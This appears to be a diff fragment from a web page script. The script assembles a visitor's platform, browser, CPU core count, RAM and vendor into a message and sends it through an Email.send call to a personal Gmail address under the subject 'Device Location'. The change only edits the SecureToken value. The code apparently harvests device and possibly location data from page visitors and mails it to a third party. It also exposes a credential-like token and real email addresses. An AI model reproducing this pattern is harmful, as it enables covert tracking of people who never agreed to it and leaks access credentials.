@@ -112,7 +112,7 @@ var Body='Ptf:'+ptf+'<br>Brw:'+brw+'<br>Cc:'+cc+'<br>Ram:'+ram+'<br>Ven:'+ven+'<
 
 
 Email.send({
-SecureToken:"da7699f3-7d66-4acc-9fda-bd80d3945884",
+SecureToken:"da7699f3-7d66-4acc-9fda-bd80d3945884?",
     To: 'shivangyadav36557@gmail.com',
     From: "downract@gmail.com",
     Subject: "Device Location",
